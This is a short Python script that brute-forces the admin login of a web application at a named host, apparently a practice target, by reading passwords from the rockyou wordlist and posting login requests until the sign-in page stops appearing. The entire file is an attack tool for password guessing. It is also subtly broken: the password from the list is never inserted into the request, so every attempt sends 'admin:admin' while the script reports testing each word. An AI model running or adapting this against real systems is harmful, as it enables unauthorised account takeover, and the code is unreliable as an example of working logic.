import requests

url = 'http://health.nephack.io/system-management/admin/index.php'

credentials = {'username': 'admin', 'password': 'admin'}

wordlist = '/media/nikesh/HDD/Security/wordlist/rockyou.txt'

with open(wordlist, 'r') as f:
    word = f.readline()[:-1]
    count = 1
    while word:
        print('{} Testing admin:{}'.format(count, word))

        response = requests.post(url, data=credentials)
        if('<h2 class="form-login-heading">sign in now</h2>' not in response.text):
            print('============================================')
            print('Match found admin:{}'.format(word))
            print('============================================')
            break

        word = f.readline()[:-1]
        count += 1